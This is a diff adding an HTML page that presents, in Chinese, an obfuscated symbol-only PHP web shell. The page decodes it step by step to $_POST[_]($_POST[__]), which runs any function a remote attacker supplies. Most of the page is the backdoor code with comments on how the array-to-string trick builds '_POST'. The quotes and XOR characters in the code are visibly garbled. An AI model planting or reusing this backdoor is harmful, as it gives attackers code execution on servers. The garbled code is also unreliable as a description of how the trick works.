@@ -1,0 +1,23 @@
+<!DOCTYPE html PUBLIC"-//W3C//DTD XHTML 1.0 Strict//EN""http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type"content="text/html; charset=gb2312"/><title>Hello SyntaxHighlighter</title><script type="text/javascript"src="../K8codeHightLight/scripts/shCore.js"></script><script type="text/javascript"src="../K8codeHightLight/scripts/shBrushJScript.js"></script><link type="text/css"rel="stylesheet"href="../K8codeHightLight/styles/shCoreDefault.css"/><script type="text/javascript">SyntaxHighlighter.all();</script></head><body style="background: white; font-family: Helvetica"><pre class="brush: js;">前几天跟lcx老大讨论了某论坛的全符号的一句话后门(这貌似不是一句话了是N句了).
+
+<?php
+$_=”";
+$_[+""]=”;
+$_=”$_”.”";
+$_=($_[+""]|””).($_[+""]|””).($_[+""]^””);
+?>
+<?php ${‘_’.$_}['_'](${‘_’.$_}['__']);?>
+
+经过测试发现原来一个数组跟一个字符串连接后会强制把数组转换为字符串”Array”,所以也就有了上面那个一句话后门。
+解密一下其实就是这个样子。
+
+<?php
+$_=”";            //$_空字符串
+$_[+""]=”;        //$_[0]为空字符串
+$_=”$_”.”";        //数组跟空字符串连接后(经php强制转换)    变成了字符串”Array” 所以$_[+""]相当于$_[0]=’A’
+$_=($_[+""]^””).($_[+""]^””).($_[+""]^””).($_[+""]^””);    //POST
+//$_=($_[+""]|””).($_[+""]|””).($_[+""]^””);                    //GET
+@${‘_’.$_}['_'](${‘_’.$_}['__']);                                    //$_POST[_]($_POST[__])
+?>
+
+</pre></html>
